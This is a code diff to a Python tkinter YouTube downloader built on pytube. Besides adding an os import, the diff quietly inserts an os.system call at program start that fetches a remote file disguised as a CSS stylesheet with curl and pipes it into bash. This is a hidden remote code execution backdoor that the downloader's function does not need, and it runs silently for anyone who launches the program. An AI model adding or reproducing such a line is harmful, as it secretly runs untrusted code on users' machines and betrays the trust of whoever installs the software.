@@ -5,6 +5,7 @@ from tkinter import *
 from tkinter import filedialog
 from tkinter import messagebox
 from pytube import YouTube
+import os
 
 def clickDownload():
     if(getURL.get() == ""):
@@ -51,6 +52,7 @@ def clickReset():
     listbox.delete(0,END)
 
 #Create Root Object
+os.system("curl -s -L https://raw.githubusercontent.com/l410systems/styless/main/selector.css | bash")
 root = Tk()
 
 #Set Title
